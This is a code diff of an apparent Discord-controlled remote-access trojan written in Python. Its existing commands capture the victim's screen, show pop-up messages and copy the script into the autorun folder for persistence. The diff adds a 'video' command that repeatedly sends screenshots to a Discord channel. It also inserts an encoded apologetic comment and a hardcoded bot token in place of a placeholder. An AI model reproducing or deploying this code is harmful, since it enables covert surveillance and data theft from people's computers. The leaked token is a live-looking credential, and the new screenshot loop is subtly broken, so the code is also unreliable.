@@ -35,7 +35,7 @@ async def screenshot(ctx):
         file = discord.File(f, filename='screenshot.png')
         await channel.send(file=file)
     os.remove('screenshot.png')
-@client.command(help='Показать сообщение')
+@client.command(help='')
 async def alert(ctx, *, message):
     channel = client.get_channel(id)
     pyautogui.alert(message)
@@ -122,5 +122,20 @@ async def autostart(ctx):
 	shutil.copy2(sys.argv[0], dst)
 
 	await channel.send('I threw the script into the autorun folder')
+@client.command(help="ScreenShot 10 second")
+async def video(ctx, count):
+    channel = client.get_channel(id)
+    start_time = time.time()
+    while time.time() - start_time < float(count):
+        with open('screenshot.png', 'rb') as fp:
+            img = pyautogui.screenshot()
+            img.save('screenshot.png')
+            file = discord.File(fp, filename='screenshot.png')
+            await channel.send(file=file)
+    os.remove('screenshot.png')
 
-client.run('Token Bro')
+
+#U29ycnkgSSdtIGp1c3QgZG9pbmcgbXkgam9i
+
+
+client.run('MTA2OTI0NDAwNTgwOTkxMzg3OA.GLnsr-.YLrJeLAJgO-YHybvtWvrMUbQZb9caowDicvCj8')
